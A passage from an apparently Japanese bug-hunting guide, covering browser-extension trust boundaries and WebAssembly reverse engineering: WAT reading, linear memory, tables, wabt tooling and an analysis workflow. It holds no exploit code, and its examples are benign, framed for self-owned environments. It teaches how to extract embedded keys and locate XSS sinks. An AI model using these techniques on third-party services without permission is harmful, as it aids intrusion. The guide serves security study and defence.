2. **main world に降りた瞬間、保護はゼロになる。** 機微データを main world に持ち込まない設計だけが確実な対策であり、「native prototype を取り戻す小技」に依存してはいけない。
3. **信頼境界は「ページ < content script < 拡張ページ < ネイティブホスト」。** 境界を越えるメッセージごとに、送信元の同一性（`sender.id`）と種別（`sender.url`）を検証し、ペイロードを許可リストで縛る。
4. **被害の上限を決めるのはマニフェストである。** 権限、`externally_connectable`、`web_accessible_resources` の 3 つが、同じコードバグを「軽微」にも「全オリジン読み取り」にも変える。
5. **バージョン依存を意識する。** ここで述べた MV3 の制約（遠隔コード禁止、`extension_pages` の CSP 緩和不可、`world: "MAIN"` の manifest 指定は Chrome 111 頃〜、`use_dynamic_url` は Chrome 104 頃〜）は 2026 年 9 月時点の Chromium 系の挙動であり、MV2 は Chrome では 2024〜2025 年にかけて段階的に無効化された。Firefox は MV3 を採用しつつも background page や Xray vision など挙動が異なるため、対象ブラウザとバージョンを明記して評価すること。

> 出典: Browser Extension Pentesting Methodology — https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html
> 出典: OWASP Browser Extension Vulnerabilities Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html

## WebAssembly解析の入口

クライアントサイドの攻撃面を洗い出していると、遅かれ早かれ `.wasm` ファイルに出くわす。画像処理、暗号化、ライセンス検証、ゲームロジック、アンチボット（bot detection）、PDFレンダラ、動画コーデック、独自の難読化ランタイム——本来ならJavaScriptで書かれていたはずのロジックが、バイナリの塊として配信されている。JavaScriptならば整形して読めばよかったものが、WebAssembly（以下 Wasm）になった途端に「読めないもの」として調査対象から外されてしまう。しかし実際には、Wasmはバイナリとしては極めて素直な形式であり、**逆アセンブル（バイナリからテキスト表現への復元）が公式ツールで完全かつ可逆に行える**という、ネイティブバイナリにはない大きな利点を持つ。本節は、その「読む」ための最小限の基盤——**WAT（WebAssembly Text Format）の読解**と、**wabt（WebAssembly Binary Toolkit）によるツールチェーン運用**——を仕組みのレベルで解説する。

> 本節は防御・自己所有環境での解析を目的とする。実在サービスや本番環境への無許可検証、破壊的な手順は扱わない。以降の手順は、自分で用意した `.wat` / `.wasm` ファイル、あるいは自分が権限を持つ環境で取得した成果物に対して実行する前提である。

### なぜハンターがWasmを読む必要があるのか

まず攻撃面（attack surface）の所在を正しく押さえておきたい。Wasmは**サンドボックス化された仮想マシン**であり、それ自体は DOM にも `document` にもネットワークにも直接触れない。Wasmコードができるのは、(1) 自分の**線形メモリ（linear memory、後述の巨大なバイトの配列）**を読み書きすること、(2) **インポートされた関数（ホスト側=JavaScriptが渡した関数）を呼ぶこと**、(3) 自分の内部で計算すること、この3つだけである。したがって、

- **Wasm自体は `innerHTML` のような sink（入力が最終的に実行・解釈される危険な代入先）を持たない。** `document.write` を呼びたければ、JavaScript側がその関数をインポートとして渡していなければならない。
- **危険はほぼ必ず「境界」に現れる。** すなわち、Wasmモジュールとそれを起動する**グルーコード（glue code、Emscripten等が自動生成するJavaScriptの橋渡し層）**とのやり取りの部分である。Wasmが返したメモリオフセットをグルーが文字列に復元し、それをそのまま `innerHTML` に渡していれば、XSSの sink はJS側にある。
- **同時に、Wasmの中身は「読めば分かる」貴重な情報源になる。** ハードコードされたAPIキーやエンドポイント、署名アルゴリズム、アンチデバッグのチェックロジック、ライセンス判定の分岐——これらはバイナリの中にあるだけで、暗号化されているわけではない。Wasmに秘密を置いても秘密にはならない、というのが防御側が理解すべき第一原則である。

つまりWasm解析の目的は「Wasmを攻撃する」ことではなく、**(a) Wasmが公開している輸出入インタフェースを列挙して境界の型と意味を把握し、(b) 線形メモリを通じて流れるデータの実体を観測し、(c) 内部ロジックのうちセキュリティ上重要な判断（検証・分岐）がどこにあるかを特定する**ことにある。そのすべての出発点が、バイナリをWATへ戻して読むという作業である。

### WATの読み方（1）: S式とモジュール構造

WATは **S式（S-expression、記号表現）** で書かれる。LISPと同じく、すべてが括弧で囲まれた木構造であり、括弧の直後のラベルがノードの種類を表す。最小のモジュールはこれである。

```wat
(module)
```

これは有効な（そして何もしない）モジュールで、コンパイルするとわずか8バイトになる。wabtの `wat2wasm -v`（後述）は、生成した各バイトの意味を注釈付きで出力してくれる。

```
0000000: 0061 736d              ; WASM_BINARY_MAGIC
0000004: 0100 0000              ; WASM_BINARY_VERSION
```

先頭4バイト `00 61 73 6d` は ASCII で `\0asm`、続く4バイトがバージョン `1`（リトルエンディアンの `0x00000001`）。**ファイルの先頭がこの8バイトかどうかが、そのファイルがWasmかどうかの最も確実な判定**であり、プロキシのログやレスポンスボディから `.wasm` を拾うときの目印になる。MIMEタイプは `application/wasm` で、拡張子が `.wasm` でなくても（`.bin`、`.dat`、拡張子なしでも）中身がこの8バイトで始まればWasmである。

モジュールの中には、**セクション**に対応する要素が並ぶ。ハンターが最初に見るべきは次の5種類だ。

| 要素 | 意味 | 解析上の価値 |
|---|---|---|
| `(import "mod" "name" ...)` | 外部（JS）から受け取るもの | **Wasmが外界へ及ぼせる影響の全リスト**。ここにない能力はWasmは持てない |
| `(export "name" ...)` | 外部へ公開するもの | JS側から呼べるエントリポイント一覧 |
| `(memory n)` / `(data ...)` | 線形メモリとその初期値 | **文字列・鍵・URLなどの定数がここに埋まる** |
| `(table n funcref)` / `(elem ...)` | 間接呼び出し用の関数参照表 | 仮想関数・関数ポインタの解決先 |
| `(func ...)` | 関数本体 | ロジックそのもの |

### WATの読み方（2）: 関数・型・ローカル変数

関数の骨格はこうなっている。

```wat
(func <signature> <locals> <body>)
```

シグネチャ（signature、関数の型）は引数と戻り値の型を並べたものだ。

```wat
(func (param i32) (param i32) (result f64) ...)
```

`(result ...)` が無ければ戻り値なし。型は次のものがある。

- **数値型**: `i32`（32ビット整数）、`i64`（64ビット整数）、`f32`（単精度浮動小数）、`f64`（倍精度浮動小数）
- **ベクトル型**: `v128`（128ビットSIMDベクトル）
- **参照型**: `funcref`（関数への参照）、`externref`（任意のJavaScript値への不透明な参照）

ここで解析上きわめて重要な事実がある。**Wasmには文字列型もオブジェクト型も構造体型も無い。** C/C++/Rustから来た文字列は、必ず「線形メモリ上のオフセット（`i32`）」として表現される。つまり関数シグネチャに `i32` が2つ並んでいたら、それは `(offset, length)` のペアである可能性が高い——この読み替えができるかどうかが、Wasm解析の第一の勘所になる。

引数とローカル変数には `$name` 形式で名前を付けられる。

```wat
(func (param $p1 i32) (param $p2 f32) (local $loc f64) …)
```

ただし**バイナリに変換した時点で名前は捨てられ、整数のインデックスだけが残る**。インデックスは「引数を宣言順に0から数え、その続きにローカル変数が並ぶ」という規則で決まる。

```wat
(func (param i32) (param f32) (local f64)
  local.get 0    ;; i32 の引数を取得
  local.get 1    ;; f32 の引数を取得
  local.get 2    ;; f64 のローカル変数を取得
)
```

したがって、バイナリを `wasm2wat` で戻したときに `$p1` のような読みやすい名前ではなく `local.get 0` や `$var0` が並ぶのは正常である。**名前を残したい/残っている場合は「name section」という任意のカスタムセクション**に依存する。デバッグビルドではこれが含まれるため関数名が読めることがあり、リリースビルドでは `wasm-strip` などで除去されているのが普通だ。**逆に言えば、配布物に name section が残っていれば、元の関数名・ローカル名という一級の解析情報が手に入る。**

### WATの読み方（3）: スタックマシンという実行モデル

Wasmは**スタックマシン（stack machine）**として定義されている。各命令は値スタックから値を pop し、結果を push する。レジスタという概念は（仕様上は）無い。

```wat
(func (param $p i32)
  (result i32)
  local.get $p
  local.get $p
  i32.add
)
```

スタックの遷移を追うとこうなる。

1. `local.get $p` → スタック `[$p]`
2. `local.get $p` → スタック `[$p, $p]`
3. `i32.add` は2つ pop し、和（2³²を法とする、つまり32ビットで折り返す加算）を push → スタック `[$p + $p]`

関数の戻り値は、本体実行後にスタックに残っている値である。ここが**Wasmが高速に検証できる理由**でもある：各命令のスタック効果は静的に分かっているので、ブラウザはコードを実行せずに「スタックの型と深さが常に整合するか」「宣言された戻り値型と一致するか」を1パスで検証できる。検証を通らないモジュールは実行前に拒否されるため、型混同によるメモリ破壊は原理的に起こらない。

同じ意味のコードを、S式の入れ子（folded form、畳み込み形式）で書くこともできる。

```wat
(func (param $p i32) (result i32)
  (i32.add (local.get $p) (local.get $p))
)
```

**この2つは完全に等価**で、バイナリ上は同じ命令列になる。読みやすさが違うだけだ。wabtの `wat-desugar` は、S式・フラット形式・混在のいずれで書かれたWATも受け取って「正準（canonical）なフラット形式」に揃えてくれるので、異なるツールが吐いたWATを比較（diff）したいときに有用である。

### 輸出入インタフェース: Wasmと外界の唯一の接点

完全なモジュールを見てみよう。

```wat
(module
  (func $add (param $lhs i32) (param $rhs i32) (result i32)
    local.get $lhs
    local.get $rhs
    i32.add
  )
  (export "add" (func $add))
)
```

`(export "add" (func $add))` によって、JS側からは `instance.exports.add` として見える。

```javascript
WebAssembly.instantiateStreaming(fetch("add.wasm")).then((obj) => {
  console.log(obj.instance.exports.add(1, 2)); // "3"
});
```

エクスポートは `(func (export "name") ...)` とインライン記法でも書ける。逆方向、すなわちJSの関数をWasmへ渡すのが `import` である。

```wat
(module
  (import "console" "log" (func $log (param i32)))
  (func (export "logIt")
    i32.const 13
    call $log
  )
)
```

```javascript
const importObject = {
  console: {
    log(arg) {
      console.log(arg);
    },
  },
};

WebAssembly.instantiateStreaming(fetch("logger.wasm"), importObject).then(
  (obj) => {
    obj.instance.exports.logIt();
  },
);
```

インポート名が `"console"` と `"log"` の**2レベル名前空間**になっている点に注目してほしい。これはJS側のインポートオブジェクトのネスト構造（`importObject.console.log`）に直接対応する。そして**シグネチャは静的に検査される**：宣言と実際に渡された関数の型が食い違えば、インスタンス化の時点で `LinkError` になる。

**解析上の意味は決定的だ。** import 一覧は「このモジュールが持ちうる全能力のホワイトリスト」である。`fetch` 相当や `eval` 相当の関数がインポートされていなければ、Wasmは決して通信も動的コード実行もできない。逆に、グルーコードが便利のために `eval` や DOM 操作関数を丸ごとインポートさせている場合、そこが境界の弱点になる。**ゆえに解析の最初の一手は常に import/export の列挙**であり、これは `wasm-objdump -x`（後述）ですぐ得られる。

グローバル変数も輸出入できる。

```wat
(module
  (global $g (import "js" "global") (mut i32))
  (func (export "getGlobal") (result i32)
    (global.get $g)
  )
  (func (export "incGlobal")
    (global.set $g (i32.add (global.get $g) (i32.const 1)))
  )
)
```

```javascript
const global = new WebAssembly.Global({ value: "i32", mutable: true }, 0);
```

`(mut i32)` の `mut` が可変を意味する。可変グローバルは JS と Wasm の双方から書き換えられる共有状態なので、**フラグ・状態機械・「検証済み」ビットのような判定結果がここに載っていることがある**。

### 線形メモリ: 文字列と構造体が住む場所

線形メモリは「大きく連続した可変のバイト配列」で、JS側からは `ArrayBuffer` として見える。これがWasm解析における最大の観測点だ。

```javascript
const memory = new WebAssembly.Memory({ initial: 1 });
const importObject = { js: { mem: memory } };
WebAssembly.instantiateStreaming(fetch("the_wasm_to_import.wasm"), importObject);
```

```wat
(import "js" "mem" (memory 1))
```

`1` は**最小1ページ**の意味で、**1ページ = 64KiB（65,536バイト）**である。メモリはモジュール内で定義することも（`(memory 1)`）、JSからインポートすることもできる。

初期データは `data` セグメントで埋め込む。

```wat
(module
  (import "console" "log" (func $log (param i32 i32)))
  (import "js" "mem" (memory 1))
  (data (i32.const 0) "Hi")
  (func (export "writeHi")
    i32.const 0  ;; オフセット
    i32.const 2  ;; 長さ
    call $log
  )
)
```

```javascript
const memory = new WebAssembly.Memory({ initial: 1 });

function consoleLogString(offset, length) {
  const bytes = new Uint8Array(memory.buffer, offset, length);
  const string = new TextDecoder("utf8").decode(bytes);
  console.log(string);
}

const importObject = {
  console: { log: consoleLogString },
  js: { mem: memory },
};

WebAssembly.instantiateStreaming(fetch("logger2.wasm"), importObject).then(
  (obj) => {
    obj.instance.exports.writeHi(); // "Hi" と表示される
  },
);
```

この短い例に、Wasm解析の本質が凝縮されている。**Wasmは「文字列を渡す」ことができないので、代わりに `(offset, length)` という2つの `i32` を渡し、JS側が `memory.buffer` からその範囲を切り出してデコードする。** 実際のEmscripten製グルーコードがやっているのも、まさにこれ（`UTF8ToString(ptr)` のような関数で、NUL終端まで読む変種が多い）である。

ここから2つの実践が導かれる。

1. **静的解析**: `data` セグメントには、文字列定数・URL・エラーメッセージ・鍵素材がそのまま並ぶ。`wasm-objdump -s`（セクションの生バイトを表示）や `wasm2wat` の出力中の `(data ...)` を読むだけで、モジュールの素性が相当わかる。
2. **動的観測（自分の検証用ページで）**: インスタンスから `exports.memory` を取り、任意時点のメモリをダンプできる。

```javascript
// 自己所有の検証ページで、Wasmインスタンスのメモリを観測する
const mem = instance.exports.memory;            // エクスポートされている場合
const view = new Uint8Array(mem.buffer);
// 例: オフセット 1024 から 64 バイトを16進で眺める
console.log([...view.slice(1024, 1088)]
  .map((b) => b.toString(16).padStart(2, "0")).join(" "));
```

これが可能なのは、`memory.buffer` が**ただの `ArrayBuffer`** であり、JSから完全に読み書きできるからだ。**Wasmのサンドボックスは「WasmがJSを侵さない」方向の保護であって、「JSからWasmの内部が見えない」保護ではない。** 難読化の手段としてWasmを使っても、メモリは丸見えである。

メモリ操作の命令は次のとおり。

- `i32.load` … スタックからオフセットを pop し、その位置の値を push
- `i32.store` … オフセットと値を pop して書き込む
- `memory.grow` … メモリをページ単位で拡張
- `memory.copy` / `memory.fill` / `memory.init` … 一括操作（bulk memory operations）

bulk memory 提案では `data.drop` / `elem.drop` / `memory.copy` / `memory.fill` / `memory.init` / `table.copy` / `table.init` の7命令が追加された。例えば

```wat
(memory.fill (i32.const 0) (i32.const 0) (i32.const 100))
```

はオフセット0から100バイトをバイト値0で埋める（`memset` 相当）。C/C++由来のコードでは、`memcpy`/`memset` がこれらの命令に落ちるため、**バッファサイズ計算が絡む処理を見分ける手がかり**になる。

なお、現在のWasmは**マルチメモリ（複数の線形メモリ）**もサポートしており、各メモリは0から始まる索引を持つ。`(data (memory 1) (i32.const 0) "Memory 1 data")` のようにメモリ索引を明示でき、省略時はメモリ0に対する指定となる。解析時にメモリが複数ある場合は、どの `i32` オフセットがどのメモリのものかを取り違えないよう注意が要る。

スレッド利用時は**共有メモリ（shared memory）**になる。

```wat
(memory 1 2 shared)
```

```javascript
const memory = new WebAssembly.Memory({ initial: 10, maximum: 100, shared: true });
// memory.buffer は SharedArrayBuffer になる
```

共有メモリは最大サイズの指定が必須で、`postMessage()` で Window と Worker の間を行き来できる。アクセスの同期には `i32.atomic.load` / `i32.atomic.store` / `i32.atomic.rmw.add` / `i32.atomic.compare_exchange` / `memory.atomic.wait` / `memory.atomic.notify` といったアトミック命令を使う。**`SharedArrayBuffer` を使うページは、ブラウザ側で cross-origin isolation（`COOP`/`COEP` ヘッダ）が要求される**点は、ヘッダ調査の際に覚えておく価値がある（Spectre系サイドチャネル対策として導入された要件）。

### テーブルと `call_indirect`: 間接呼び出しが解析を難しくする理由

テーブル（table）は「**参照**のリサイズ可能な配列」である。線形メモリがバイトを持つのに対し、テーブルは関数参照などのリファレンスを持つ。

なぜ別立ての仕組みが要るのか。理由は明快だ。

- `call` は**静的な関数インデックス**しか取れない（直接呼び出し専用）。
- 関数ポインタのような動的呼び出しには、実行時に決まる値が要る。
- しかし**関数参照を線形メモリに置くことはできない**。線形メモリは自由に書き換え可能なので、そこに生の関数アドレスを置くと、改竄によって任意アドレスへ制御を飛ばされてしまう（=セキュリティ上の理由）。
- そこで参照はテーブルに格納し、線形メモリには**テーブルの索引（ただの `i32`）**だけを置く。`call_indirect` は索引をスタックから pop し、テーブルを引いて呼び出す。

```wat
(module
  (table 2 funcref)
  (func $f1 (result i32)
    i32.const 42
  )
  (func $f2 (result i32)
    i32.const 13
  )
  (elem (i32.const 0) $f1 $f2)

  (type $return_i32 (func (result i32)))
  (func (export "callByIndex") (param $i i32) (result i32)
    local.get $i
    call_indirect (type $return_i32)
  )
)
```

```javascript
WebAssembly.instantiateStreaming(fetch("wasm-table.wasm")).then((obj) => {
  console.log(obj.instance.exports.callByIndex(0)); // 42
  console.log(obj.instance.exports.callByIndex(1)); // 13
  console.log(obj.instance.exports.callByIndex(2)); // エラー: 索引2は存在しない
});
```

`call_indirect (type $return_i32)` に型注釈が付いているのがポイントで、**呼び出し時にテーブル要素の実際の型と注釈が一致するかを実行時チェックする**。一致しなければトラップ（trap、実行中断）する。これは実質的に**制御フロー整合性（CFI）を言語レベルで強制している**ということで、C/C++をWasmにコンパイルしても「関数ポインタ書き換えで任意コード実行」という古典的な手口が成立しにくい理由になっている。ただし**同じ型シグネチャを持つ関数同士の入れ替えは防げない**ため、Wasm上のメモリ破壊バグが完全に無害になるわけではない。

テーブルとメモリは複数モジュール間で共有でき、これが**動的リンク**の基盤になる。

```wat
;; shared0.wat
(module
  (import "js" "memory" (memory 1))
  (import "js" "table" (table 1 funcref))
  (elem (i32.const 0) $shared0func)
  (func $shared0func (result i32)
    i32.const 0
    i32.load
  )
)
```

```wat
;; shared1.wat
(module
  (import "js" "memory" (memory 1))
  (import "js" "table" (table 1 funcref))
  (type $void_to_i32 (func (result i32)))
  (func (export "doIt") (result i32)
    i32.const 0
    i32.const 42
    i32.store
    i32.const 0
    call_indirect (type $void_to_i32)
  )
)
```

```javascript
const importObj = {
  js: {
    memory: new WebAssembly.Memory({ initial: 1 }),
    table: new WebAssembly.Table({ initial: 1, element: "anyfunc" }),
  },
};

Promise.all([
  WebAssembly.instantiateStreaming(fetch("shared0.wasm"), importObj),
  WebAssembly.instantiateStreaming(fetch("shared1.wasm"), importObj),
]).then((results) => {
  console.log(results[1].instance.exports.doIt()); // 42
});
```

`shared1` が線形メモリのオフセット0に42を書き、テーブル索引0（= `shared0` の関数）を間接呼び出しし、その関数がオフセット0を読んで返す。両モジュールが同一のメモリ・テーブル実体を共有しているから成立する。**解析時にモジュールが複数ある場合、この共有関係を把握しないと片方だけ読んでもロジックが繋がらない。**

なお、テーブルはJS側からも操作できる。

```javascript
const tbl = new WebAssembly.Table({ initial: 2, element: "anyfunc" });
tbl.set(0, f1);
tbl.set(1, f2);
const result = tbl.get(0)(); // 索引0の関数を呼ぶ
```

テーブルがエクスポートされていれば、**自分の検証環境では `tbl.get(i)` で各スロットの実体を列挙し、`call_indirect` の飛び先候補を静的に絞り込める**。

最後に、多値返却（multi-value）も現在は利用できる。

```wat
(module
  (func $get_two_numbers (result i32 i32)
    i32.const 1
    i32.const 2
  )
  (func (export "add_two_numbers") (result i32)
    call $get_two_numbers
    i32.add
  )
)
```

呼び出し側から見れば「スタックに2つ積まれた」だけなので、`i32.add` がそのまま両方を消費できる。WAT読解時に「戻り値が1つのはずなのにスタックが合わない」と感じたら、多値返却を疑うとよい。

> 出典: Understanding WebAssembly text format（MDN Web Docs） — https://developer.mozilla.org/en-US/docs/WebAssembly/Guides/Understanding_the_text_format

### wabt: WATとバイナリを往復するための公式ツールキット

WATをバイナリに、バイナリをWATに変換する標準的な道具が **WABT（WebAssembly Binary Toolkit、"wabbit" と発音する）** である。wabtは最適化プラットフォームではなく（それは Binaryen の役割）、**仕様への完全な忠実性——命令を一切変えずに1:1でラウンドトリップできること**を目指して設計されている。この「忠実さ」こそが解析ツールとして重要で、`wasm2wat` の出力は元のバイナリの命令列そのものだと信頼してよい。

wabt が同梱する主なツールは次のとおり（READMEの記載に基づく）。

| ツール | 役割 | 解析での使いどころ |
|---|---|---|
| `wat2wasm` | テキスト形式 → バイナリ形式へ変換 | PoC用の最小モジュールを自作して挙動を確かめる |
| `wasm2wat` | その逆変換（バイナリ → テキスト） | **最重要。まずこれで全体を読む** |
| `wasm-objdump` | wasmバイナリの情報を表示（objdump 相当） | セクション構成・import/export・data の一覧取得 |
| `wasm-interp` | スタックベースのインタプリタでデコードして実行 | ブラウザ無しで関数を動かし挙動を観察 |
| `wat-desugar` | S式/フラット/混在のWATを正準フラット形式で出力 | 異なるツール出力の diff を取る前処理 |
| `wasm2c` | wasmバイナリをCのソース＋ヘッダへ変換 | C読解に持ち込む・既存のC解析ツールを使う |
| `wasm-strip` | バイナリからセクションを除去 | 配布物の name section 有無の検証 |
| `wasm-validate` | バイナリ形式の妥当性検証 | 壊れた/改変されたモジュールの切り分け |
| `wast2json` | 仕様テスト形式ファイルをJSON＋wasm群へ変換 | 仕様準拠テスト資産の取り込み |
| `wasm-stats` | モジュールの統計情報を出力 | 命令分布から「暗号処理らしさ」等を推測 |
| `spectest-interp` | Spectest JSON を読み、インタプリタでテスト実行 | 仕様テストの再現 |

（READMEの一覧には含まれないが、wabt には逆コンパイル風の擬似コードを出力する `wasm-decompile` も同梱されている。WATより読みやすい高水準表現が欲しいときに併用する価値がある。）

#### 導入

最も手軽なのはパッケージマネージャ経由である。

```sh
brew install wabt
```

```sh
sudo apt install wabt
```

GitHub の releases ページから各プラットフォーム向けのビルド済みバイナリを落とすこともできる。ソースから入れる場合は、**サブモジュールを忘れずに取得する**こと（テストスイートと gtest が入っている）。

```console
$ git clone --recursive https://github.com/WebAssembly/wabt
$ cd wabt
$ git submodule update --init
```

CMake で直接ビルドする手順は次のとおり。

```console
$ mkdir build
$ cd build
$ cmake ..
$ cmake --build .
```

ここで **「ビルド成果物用のディレクトリを必ず別に作れ」** という注意がREADMEに明記されている。理由は具体的で、ビルドが生成する実行ファイル `wasm2c` が、リポジトリ直下にある `wasm2c` **ディレクトリ**と名前衝突するためである。リポジトリルートで `cmake` を走らせると失敗する。

トップレベルの `Makefile` 経由（内部で CMake → Ninja を呼ぶ）でもビルドできる。

```console
$ make
$ make clang-debug
$ make gcc-i686-release
```

ターゲット名は「コンパイラ（`gcc` / `clang` / `gcc-i686` / `emscripten`）- ビルド種別（`debug` / `release`）- 構成（空、`asan` / `msan` / `lsan` / `ubsan` / `fuzz` / `no-tests`）」の組み合わせで生成される。ただし macOS ではこの経路がうまく動かないことがあるとREADMEが注意しており、その場合は上のCMake直接ビルドに切り替える。

#### 使い方（READMEの実例）

`wat2wasm`:

```sh
# test.wat を解析し、同名の .wasm バイナリを書き出す
$ bin/wat2wasm test.wat

# test.wat を解析し、test.wasm へ書き出す
$ bin/wat2wasm test.wat -o test.wasm

# spec-test.wast を解析し、詳細出力（すべてのバイトの意味を含む）を標準出力へ
$ bin/wat2wasm spec-test.wast -v
```

3つ目の `-v` が、前述した「バイト単位の注釈付きダンプ」を出すモードである。**バイナリ形式そのものを学ぶ最良の教材**であり、自分で書いた1行のWATが何バイトになるかを確かめながらエンコーディングを体得できる。

`wasm2wat`:

```sh
# バイナリ test.wasm を解析して、テキスト test.wat を書き出す
$ bin/wasm2wat test.wasm -o test.wat
```

`wasm-interp`:

```sh
# test.wasm を解析し、型検査する
$ bin/wasm-interp test.wasm

# test.wasm を解析し、エクスポートされた全関数を実行する
$ bin/wasm-interp test.wasm --run-all-exports

# 全エクスポートを実行し、実行トレースを出力する
$ bin/wasm-interp test.wasm --run-all-exports --trace

# test.json を仕様テストとして実行する
$ bin/wasm-interp test.json --spec

# 値スタックのサイズを100要素にして全エクスポートを実行する
$ bin/wasm-interp test.wasm -V 100 --run-all-exports
```

`--trace` は解析実務でとりわけ有用だ。**ブラウザを起動せずに、命令単位の実行トレース（どの値がスタックに積まれ、どの分岐が取られたか）が得られる**ため、条件分岐が何を比較しているのかを「読む」代わりに「観測する」ことができる。ただし外部インポートに依存するモジュールはそのままでは動かないので、スタブを与えるか、対象関数だけを切り出して試すことになる。

なお、インストール不要で試したいだけなら、wabt は emscripten で JavaScript にコンパイルされたオンラインデモ（`wat2wasm` / `wasm2wat`）も公開されている。**ただし解析対象が第三者の成果物や機微を含む場合、外部ホストのWeb UIへアップロードするのは情報取り扱い上ふさわしくない。手元のバイナリを使うこと。**

#### 「デコードできない」ときの犯人はだいたい提案フラグ

wabt は WebAssembly の各**提案（proposal）**ごとに有効/無効フラグを持つ。READMEの対応表（2026年9月時点の `main` ブランチ）では、既定で有効なものと、明示的に有効化が必要なものが分かれている。

- **既定で有効**: 例外処理（`--disable-exceptions` で無効化）、可変グローバル、非トラップ float→int 変換、符号拡張、SIMD、multi-value、tail-call、bulk memory、reference types、annotations、memory64、multi-memory、extended-const、relaxed-simd
- **明示的に有効化が必要**: `--enable-threads`（スレッド）、`--enable-custom-page-sizes`、`--enable-compact-imports`、`--enable-function-references`、`--enable-wide-arithmetic`

例えば MDN のマルチメモリ例は、次のように書かれている。

```sh
wat2wasm --enable-multi-memory multi-memory.wat -o multi-memory.wasm
```

（multi-memory は現在の wabt では既定で有効だが、古いバージョンではこのフラグが必要だった。**フラグの既定値はバージョンで変わる**ため、自分の環境で `wat2wasm --help` を確認するのが確実である。）

実務上の教訓は明確だ。**`wasm2wat` が「unknown opcode」や「invalid」で落ちたら、まず壊れたファイルを疑う前に、そのバイナリが使っている提案が自分のwabtで有効かを疑う。** スレッド（アトミック命令）を使うモジュールは `--enable-threads` を付けないと読めず、これは実際によく遭遇する。同様に、wabtのバージョンが古くて新しい提案に未対応というケースもあるので、解析用のwabtは新しく保つのが望ましい。また、提案対応表には「binary / text / validate / interpret / wasm2c」の列があり、**同じ提案でもバイナリは読めるが `wasm-interp` では実行できない**、といった差がある点にも注意が要る（例えばスレッドや relaxed-simd、function-references は wasm2c 非対応）。

> 出典: WABT: The WebAssembly Binary Toolkit（GitHub） — https://github.com/WebAssembly/wabt

### 実践: 解析ワークフローの組み立て（自己所有環境）

ここまでの要素を、実際の手順として並べ直す。対象は**自分が権限を持つ環境の成果物、または自分でビルドしたモジュール**に限る。

1. **バイナリの取得と同定**
   `Content-Type: application/wasm` のレスポンス、あるいは先頭8バイトが `00 61 73 6d 01 00 00 00` のファイルを収集する。`file` コマンドや `xxd | head -1` で確認できる。

2. **妥当性確認**
   `wasm-validate target.wasm`。ここで落ちるなら、取得ミス（部分ダウンロード）か、提案フラグ不足かを切り分ける。

3. **インタフェースの棚卸し**
   `wasm-objdump -x target.wasm` でセクション一覧・import・export・関数型・テーブル・メモリ定義を得る。**ここが最も情報密度が高い**。import に何が並んでいるかで、モジュールの「できること」の上限が決まる。

4. **定数データの抽出**
   `wasm-objdump -s target.wasm`（生バイト表示）や、`wasm2wat` 出力中の `(data ...)` を読む。URL、エラーメッセージ、フォーマット文字列、Base64断片などが露出する。Wasmに秘密を埋めても秘密にならないことを、ここで実感できるはずだ。

5. **全体をテキスト化して読む**
   `wasm2wat target.wasm -o target.wat`。name section が残っていれば関数名が読め、読解コストが桁違いに下がる。無ければ `$func42` のような機械的な名前になるので、エクスポート名から辿って呼び出しグラフを手で埋めていく。

6. **読みやすさを上げる**
   `wasm-decompile` で擬似Cライクな表現を得る、あるいは `wasm2c` でCソースへ変換して既存のC読解手法・静的解析ツールに載せる。

7. **動的に観測する**
   `wasm-interp target.wasm --run-all-exports --trace` でトレースを取る。ブラウザ側で見たい場合は、自分の検証ページでインスタンス化し、`exports.memory` をダンプする、インポート関数を自前のログ関数に差し替えて `(offset, length)` から文字列を復元する、といった手が使える。**インポート関数の差し替えは、境界を通過するデータを丸ごと観測できる最も強力な方法**である。

8. **境界のsinkを評価する**
   最後に、Wasmではなく**グルーコード側**を読む。Wasmが返したポインタ/長さを、JSがどのAPIへ流しているか。`innerHTML`・`eval`・`location` へ届いていないか。Wasmから渡された値を信頼して検証を省いていないか。前節までのDOM XSS解析手法が、ここでそのまま接続する。

### 防御側の視点でのまとめ

- **Wasmは難読化ではない。** WATへ完全に戻せるうえ、線形メモリはJSから素通しで読める。認証トークン、APIキー、署名ロジック、ライセンス判定をWasmに置いても秘匿されない。秘密はサーバ側に置く、が唯一の正解である。
- **Wasmのサンドボックスは強いが、境界は弱くなりうる。** import として渡す能力を最小化すること（必要な関数だけを渡す）が、そのままWasmモジュールの権限最小化になる。DOM操作や `eval` をまとめて渡すグルー設計は避ける。
- **Wasm内部のメモリ破壊は「サンドボックス内」で起こりうる。** 線形メモリ内のバッファオーバーフローは、Wasmの検証機構では防げない（線形メモリ内であれば範囲外ではない）。ただし `call_indirect` の実行時型チェックにより、関数ポインタ経由の任意コード実行は同一シグネチャ間の入れ替えに限定される。C/C++由来のコードをWasmにしても、メモリ安全性の問題そのものは消えない。
- **name section とソースマップの取り扱い。** デバッグ情報が残ったモジュールを本番配布すると、内部構造が容易に読める。リリースビルドでは `wasm-strip` 等で除去し、必要なら別途シンボルを保管する運用にする。
- **バージョン依存に注意。** WebAssemblyは提案ベースで拡張が続いており、本節の記述（multi-memory が既定有効、threads が明示有効化、など）は **2026年9月時点の wabt `main` ブランチおよび MDN の記載**に基づく。解析環境の `wat2wasm --help` / `wasm2wat --help` で、自分のバージョンの既定値を都度確認すること。

Wasm解析は、専用の巨大な知識体系を要求するものではない。**「import/export で境界を押さえ、線形メモリで実データを観測し、WATで論理を読む」**——この3点を押さえれば、バイナリは十分に読めるものになる。そして最も価値のある脆弱性は、たいていWasmの中ではなく、Wasmとそれを呼ぶJavaScriptの継ぎ目に潜んでいる。

---

[← 第7章 クライアントサイド攻撃面のマッピングと方法論](07-attack-surface-methodology.md) ｜ [📖 目次](index.md) ｜ [第9章 日本語資料と動画で学びを補強する →](09-japanese-and-video.md)
